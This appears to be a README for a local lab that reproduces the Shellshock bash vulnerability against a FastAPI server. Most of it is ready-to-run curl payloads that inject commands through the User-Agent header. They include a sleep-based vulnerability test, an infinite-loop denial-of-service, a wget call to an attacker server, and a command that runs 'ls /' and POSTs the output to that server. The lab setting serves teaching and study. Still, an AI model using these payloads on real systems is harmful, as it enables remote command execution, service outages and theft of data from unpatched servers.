# Shellshock vulnerability

## Running the resources you need for reproducing the Shellshock vulnerability
1. Follow the instructions in the README.md file in the `shellshock-server` directory.
2. Start the attacker server from the `attacker-server` directory. The server will run on port 8080 by default, but this aspect can be changed in the `application.properties` file.
3. Open a linux terminal, you can now play with the system.

## Commands
The basic command to the FastAPI server would look like this:
```bash
curl -A 'Mozilla/5.0' -X POST 127.0.0.1:80/user-agent > /dev/null
```

The commands that takes advantage of the Shellshock vulnerability would look like this:
```bash
curl -A '() { :;}; _your_evil_command_goes_here_' -X POST 127.0.0.1:80/user-agent
```

## Examples
### How can you find if the server is vulnerable to Shellshock exploit
```bash
curl -A '() { :;}; /bin/sleep 5|/sbin/sleep 5|/usr/bin/sleep 5' -X POST 127.0.0.1:80/user-agent > /dev/null
```
### A simple (but very effective) denial-of-service example
```bash
curl -A '() { :;}; while true; do :; done;' -X POST 127.0.0.1:80/user-agent > /dev/null
```
### Sending a request to an attacker's server
```bash
curl -A '() { :;}; /usr/bin/wget http://host.docker.internal:8080/attacker' -X POST 127.0.0.1:80/user-agent > /dev/null
```
### Running a command on the FastAPI server and sending the result via a POST request to the attacker's server
```bash
curl -A '() { :;}; curl -X POST -H "command: ls /" -d $(ls /) host.docker.internal:8080/command-outputs' -X POST 127.0.0.1:80/user-agent > /dev/null
```

The last command allows us to run any command and to store it's result in our server.